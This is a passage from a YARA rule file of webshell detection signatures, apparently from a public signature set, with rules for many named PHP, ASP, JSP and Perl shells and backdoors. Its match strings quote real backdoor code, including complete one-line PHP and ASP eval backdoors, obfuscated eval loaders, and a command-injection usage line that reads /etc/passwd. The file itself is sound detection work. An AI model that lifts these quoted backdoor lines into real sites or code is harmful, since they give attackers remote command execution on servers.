		$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
		$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
		$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
	condition:
		1 of them
}
rule webshell_webshells_new_JJJsp2 {
	meta:
		description = "Web shells - generated from file JJJsp2.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "5a9fec45236768069c99f0bfd566d754"
	strings:
		$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
		$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
		$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
		$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
	condition:
		1 of them
}
rule webshell_webshells_new_radhat {
	meta:
		description = "Web shells - generated from file radhat.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "72cb5ef226834ed791144abaa0acdfd4"
	strings:
		$s1 = "sod=Array(\"D\",\"7\",\"S"
	condition:
		all of them
}
rule webshell_webshells_new_asp1 {
	meta:
		description = "Web shells - generated from file asp1.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b63e708cd58ae1ec85cf784060b69cad"
	strings:
		$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
		$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_php6 {
	meta:
		description = "Web shells - generated from file php6.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "ea75280224a735f1e445d244acdfeb7b"
	strings:
		$s1 = "array_map(\"asx73ert\",(ar"
		$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
		$s4 = "shell.php?qid=zxexp  " fullword
	condition:
		1 of them
}
rule webshell_webshells_new_xxx {
	meta:
		description = "Web shells - generated from file xxx.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "0e71428fe68b39b70adb6aeedf260ca0"
	strings:
		$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
	condition:
		all of them
}
rule webshell_GetPostpHp {
	meta:
		description = "Web shells - generated from file GetPostpHp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "20ede5b8182d952728d594e6f2bb5c76"
	strings:
		$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
	condition:
		all of them
}
rule webshell_webshells_new_php5 {
	meta:
		description = "Web shells - generated from file php5.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "cf2ab009cbd2576a806bfefb74906fdf"
	strings:
		$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
	condition:
		all of them
}
rule webshell_webshells_new_PHP {
	meta:
		description = "Web shells - generated from file PHP.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "a524e7ae8d71e37d2fd3e5fbdab405ea"
	strings:
		$s1 = "echo \"<font color=blue>Error!</font>\";" fullword
		$s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
		$s5 = " - ExpDoor.com</title>" fullword
		$s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
		$s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_Asp {
	meta:
		description = "Web shells - generated from file Asp.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "32c87744ea404d0ea0debd55915010b7"
	strings:
		$s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
		$s2 = "Function MorfiCoder(Code)" fullword
		$s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
	condition:
		1 of them
}

/* Update from hackers tool pack */

rule perlbot_pl {
	meta:
		description = "Semi-Auto-generated  - file perlbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
	strings:
		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
		$s1 = "#Acesso a Shel - 1 ON 0 OFF"
	condition:
		1 of them
}
rule php_backdoor_php {
	meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"
	condition:
		1 of them
}
rule Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php {
	meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
	condition:
		1 of them
}
rule Nshell__1__php_php {
	meta:
		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "973fc89694097a41e684b43a21b1b099"
	strings:
		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
	condition:
		1 of them
}
rule shankar_php_php {
	meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"
	condition:
		1 of ($s*) and $sAuthor
}
rule Casus15_php_php {
	meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "
	condition:
		1 of them
}
rule small_php_php {
	meta:
		description = "Semi-Auto-generated  - file small.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "fcee6226d09d150bfa5f103bee61fbde"
	strings:
		$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
		$s4 = "@ini_set('error_log',NULL);" fullword
	condition:
		2 of them
}
rule shellbot_pl {
	meta:
		description = "Semi-Auto-generated  - file shellbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
	strings:
		$s0 = "ShellBOT"
		$s1 = "PacktsGr0up"
		$s2 = "CoRpOrAtIoN"
		$s3 = "# Servidor de irc que vai ser usado "
		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"
	condition:
		2 of them
}
rule fuckphpshell_php {
	meta:
		description = "Semi-Auto-generated  - file fuckphpshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "554e50c1265bb0934fcc8247ec3b9052"
	strings:
		$s0 = "$succ = \"Warning! "
		$s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
		$s2 = "\\*=-- MEMBERS AREA --=*/"
		$s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"
	condition:
		2 of them
}
rule ngh_php_php {
	meta:
		description = "Semi-Auto-generated  - file ngh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
	strings:
		$s0 = "Cr4sh_aka_RKL"
		$s1 = "NGH edition"
		$s2 = "/* connectback-backdoor on perl"
		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"
	condition:
		1 of them
}
rule jsp_reverse_jsp {
	meta:
		description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8b0e6779f25a17f0ffb3df14122ba594"
	strings:
		$s0 = "// backdoor.jsp"
		$s1 = "JSP Backdoor Reverse Shell"
		$s2 = "http://michaeldaw.org"
	condition:
		2 of them
}
rule Tool_asp {
	meta:
		description = "Semi-Auto-generated  - file Tool.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
	strings:
		$s0 = "mailto:rhfactor@antisocial.com"
		$s2 = "?raiz=root"
		$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
		$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"
	condition:
		2 of them
}
rule NT_Addy_asp {
	meta:
		description = "Semi-Auto-generated  - file NT Addy.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2e0d1bae844c9a8e6e351297d77a1fec"
	strings:
		$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
		$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
		$s4 = "RAW D.O.S. COMMAND INTERFACE"
	condition:
		1 of them
}
rule SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php {
	meta:
		description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
	strings:
		$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
		$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
		$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"
	condition:
		1 of them
}
rule RemExp_asp {
	meta:
		description = "Semi-Auto-generated  - file RemExp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
	strings:
		$s0 = "<title>Remote Explorer</title>"
		$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
		$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
	condition:
		2 of them
}
rule phvayvv_php_php {
	meta:
		description = "Semi-Auto-generated  - file phvayvv.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "35fb37f3c806718545d97c6559abd262"
	strings:
		$s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
		$s1 = "$baglan=fopen($duzkaydet,'w');"
		$s2 = "PHVayv 1.0"
	condition:
		1 of them
}
rule klasvayv_asp {
	meta:
		description = "Semi-Auto-generated  - file klasvayv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2b3e64bf8462fc3d008a3d1012da64ef"
	strings:
		$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
		$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
		$s3 = "<font color=\"#858585\">www.aventgrup.net"
		$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"
	condition:
		1 of them
}
rule r57shell_php_php {
	meta:
		description = "Semi-Auto-generated  - file r57shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d28445de424594a5f14d0fe2a7c4e94f"
	strings:
		$s0 = "r57shell" fullword
		$s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
		$s2 = "RusH security team"
		$s3 = "'ru_text12' => 'back-connect"
	condition:
		1 of them
}
rule rst_sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0961641a4ab2b8cb4d2beca593a92010"
	strings:
		$s0 = "C:\\tmp\\dump_"
		$s1 = "RST MySQL"
		$s2 = "http://rst.void.ru"
		$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"
	condition:
		2 of them
}
rule wh_bindshell_py {
	meta:
		description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "fab20902862736e24aaae275af5e049c"
	strings:
		$s0 = "#Use: python wh_bindshell.py [port] [password]"
		$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
		$s3 = "#bugz: ctrl+c etc =script stoped=" fullword
	condition:
		1 of them
}
rule lurm_safemod_on_cgi {
	meta:
		description = "Semi-Auto-generated  - file lurm_safemod_on.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5ea4f901ce1abdf20870c214b3231db3"
	strings:
		$s0 = "Network security team :: CGI Shell" fullword
		$s1 = "#########################<<KONEC>>#####################################" fullword
		$s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
	condition:
		1 of them
}
rule c99madshell_v2_0_php_php {
	meta:
		description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d27292895da9afa5b60b9d3014f39294"
	strings:
		$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"
	condition:
		all of them
}
rule backupsql_php_often_with_c99shell {
	meta:
		description = "Semi-Auto-generated  - file backupsql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ab1a06ab1a1fe94e3f3b7f80eedbc12f"
	strings:
		$s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
		$s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
	condition:
		all of them
}
rule uploader_php_php {
	meta:
		description = "Semi-Auto-generated  - file uploader.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0b53b67bb3b004a8681e1458dd1895d0"
	strings:
		$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
		$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
		$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
	condition:
		2 of them
}
rule telnet_pl {
	meta:
		description = "Semi-Auto-generated  - file telnet.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "dd9dba14383064e219e29396e242c1ec"
	strings:
		$s0 = "W A R N I N G: Private Server"
		$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "
	condition:
		all of them
}
rule w3d_php_php {
	meta:
		description = "Semi-Auto-generated  - file w3d.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "987f66b29bfb209a0b4f097f84f57c3b"
	strings:
		$s0 = "W3D Shell"
		$s1 = "By: Warpboy"
		$s2 = "No Query Executed"
	condition:
		2 of them
}
rule WebShell_cgi {
	meta:
		description = "Semi-Auto-generated  - file WebShell.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "bc486c2e00b5fc3e4e783557a2441e6f"
	strings:
		$s0 = "WebShell.cgi"
		$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"
	condition:
		all of them
}
rule WinX_Shell_html {
	meta:
		description = "Semi-Auto-generated  - file WinX Shell.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
	strings:
		$s0 = "WinX Shell"
		$s1 = "Created by greenwood from n57"
		$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"
	condition:
		2 of them
}
rule Dx_php_php {
	meta:
		description = "Semi-Auto-generated  - file Dx.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"
	condition:
		1 of them
}
rule csh_php_php {
	meta:
		description = "Semi-Auto-generated  - file csh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "194a9d3f3eac8bc56d9a7c55c016af96"
	strings:
		$s0 = ".::[c0derz]::. web-shell"
		$s1 = "http://c0derz.org.ua"
		$s2 = "vint21h@c0derz.org.ua"
		$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"
	condition:
		1 of them
}
rule pHpINJ_php_php {
	meta:
		description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d7a4b0df45d34888d5a09f745e85733f"
	strings:
		$s1 = "News Remote PHP Shell Injection"
		$s3 = "Php Shell <br />" fullword
		$s4 = "<input type = \"text\" name = \"url\" value = \""
	condition:
		2 of them
}
rule sig_2008_php_php {
	meta:
		description = "Semi-Auto-generated  - file 2008.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "3e4ba470d4c38765e4b16ed930facf2c"
	strings:
		$s0 = "Codz by angel(4ngel)"
		$s1 = "Web: http://www.4ngel.net"
		$s2 = "$admin['cookielife'] = 86400;"
		$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"
	condition:
		1 of them
}
rule ak74shell_php_php {
	meta:
		description = "Semi-Auto-generated  - file ak74shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "7f83adcb4c1111653d30c6427a94f66f"
	strings:
		$s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
		$s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
		$s3 = "$xshell"
	condition:
		2 of them
}
rule Rem_View_php_php {
	meta:
		description = "Semi-Auto-generated  - file Rem View.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
	strings:
		$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 ="Welcome to phpRemoteView (RemView)"
	condition:
		1 of them
}
rule Java_Shell_js {
	meta:
		description = "Semi-Auto-generated  - file Java Shell.js.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
	strings:
		$s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
		$s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
		$s4 = "public static int DEFAULT_SCROLLBACK = 100"
	condition:
		2 of them
}
rule STNC_php_php {
	meta:
		description = "Semi-Auto-generated  - file STNC.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2e56cfd5b5014cbbf1c1e3f082531815"
	strings:
		$s0 = "drmist.ru" fullword
		$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
		$s2 = "STNC WebShell"
		$s3 = "http://www.security-teams.net/index.php?showtopic="
	condition:
		1 of them
}
rule aZRaiLPhp_v1_0_php {
	meta:
		description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "26b2d3943395682e36da06ed493a3715"
	strings:
		$s0 = "azrailphp"
		$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
		$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"
	condition:
		2 of them
}
rule Moroccan_Spamers_Ma_EditioN_By_GhOsT_php {
	meta:
		description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d1b7b311a7ffffebf51437d7cd97dc65"
	strings:
		$s0 = ";$sd98=\"john.barker446@gmail.com\""
		$s1 = "print \"Sending mail to $to....... \";"
		$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"
	condition:
		1 of them
}
rule zacosmall_php {
	meta:
		description = "Semi-Auto-generated  - file zacosmall.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5295ee8dc2f5fd416be442548d68f7a6"
	strings:
		$s0 = "rand(1,99999);$sj98"
		$s1 = "$dump_file.='`'.$rows2[0].'`"
		$s3 = "filename=\\\"dump_{$db_dump}_${table_d"
	condition:
		2 of them
}
rule CmdAsp_asp {
	meta:
		description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "64f24f09ec6efaa904e2492dffc518b9"
	strings:
		$s0 = "CmdAsp.asp"
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s2 = "-- Use a poor man's pipe ... a temp file --"
		$s3 = "maceo @ dogmile.com"
	condition:
		2 of them
}
rule simple_backdoor_php {
	meta:
		description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
	condition:
		2 of them
}
rule mysql_shell_php {
	meta:
		description = "Semi-Auto-generated  - file mysql_shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d42aec2891214cace99b3eb9f3e21a63"
	strings:
		$s0 = "SooMin Kim"
		$s1 = "smkim@popeye.snu.ac.kr"
		$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"
	condition:
		1 of them
}
rule Dive_Shell_1_0___Emperor_Hacking_Team_php {
	meta:
		description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "1b5102bdc41a7bc439eea8f0010310a5"
	strings:
		$s0 = "Emperor Hacking TEAM"
		$s1 = "Simshell" fullword
		$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
		$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"
	condition:
		2 of them
}
rule Asmodeus_v0_1_pl {
	meta:
		description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0978b672db0657103c79505df69cb4bb"
	strings:
		$s0 = "[url=http://www.governmentsecurity.org"
		$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
		$s2 = "print \"Asmodeus Perl Remote Shell"
		$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
	condition:
		2 of them
}
rule backup_php_often_with_c99shell {
	meta:
		description = "Semi-Auto-generated  - file backup.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "aeee3bae226ad57baf4be8745c3f6094"
	strings:
		$s0 = "#phpMyAdmin MySQL-Dump" fullword
		$s2 = ";db_connect();header('Content-Type: application/octetstr"
		$s4 = "$data .= \"#Database: $database" fullword
	condition:
		all of them
}
rule Reader_asp {
	meta:
		description = "Semi-Auto-generated  - file Reader.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ad1a362e0a24c4475335e3e891a01731"
	strings:
		$s1 = "Mehdi & HolyDemon"
		$s2 = "www.infilak."
		$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"
	condition:
		2 of them
}
rule phpshell17_php {
	meta:
		description = "Semi-Auto-generated  - file phpshell17.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "9a928d741d12ea08a624ee9ed5a8c39d"
	strings:
		$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
		$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
		$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword
	condition:
		1 of them
}
rule myshell_php_php {
	meta:
		description = "Semi-Auto-generated  - file myshell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "62783d1db52d05b1b6ae2403a7044490"
	strings:
		$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
		$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
		$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"
	condition:
		2 of them
}
rule SimShell_1_0___Simorgh_Security_MGZ_php {
	meta:
		description = "Semi-Auto-generated  - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "37cb1db26b1b0161a4bf678a6b4565bd"
	strings:
		$s0 = "Simorgh Security Magazine "
		$s1 = "Simshell.css"
		$s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], "
		$s3 = "www.simorgh-ev.com"
	condition:
		2 of them
}
rule jspshall_jsp {
	meta:
		description = "Semi-Auto-generated  - file jspshall.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
	strings:
		$s0 = "kj021320"
		$s1 = "case 'T':systemTools(out);break;"
		$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"
	condition:
		2 of them
}
rule webshell_php {
	meta:
		description = "Semi-Auto-generated  - file webshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "e425241b928e992bde43dd65180a4894"
	strings:
		$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
		$s3 = "PHP Web Shell"
	condition:
		all of them
}
rule rootshell_php {
	meta:
		description = "Semi-Auto-generated  - file rootshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "265f3319075536030e59ba2f9ef3eac6"
	strings:
		$s0 = "shells.dl.am"
		$s1 = "This server has been infected by $owner"
		$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
		$s4 = "Could not write to file! (Maybe you didn't enter any text?)"
	condition:
		2 of them
}
rule connectback2_pl {
	meta:
		description = "Semi-Auto-generated  - file connectback2.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "473b7d226ea6ebaacc24504bd740822e"
	strings:
		$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
		$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
		$s2 = "ConnectBack Backdoor"
	condition:
		1 of them
}
rule DefaceKeeper_0_2_php {
	meta:
		description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "713c54c3da3031bc614a8a55dccd7e7f"
	strings:
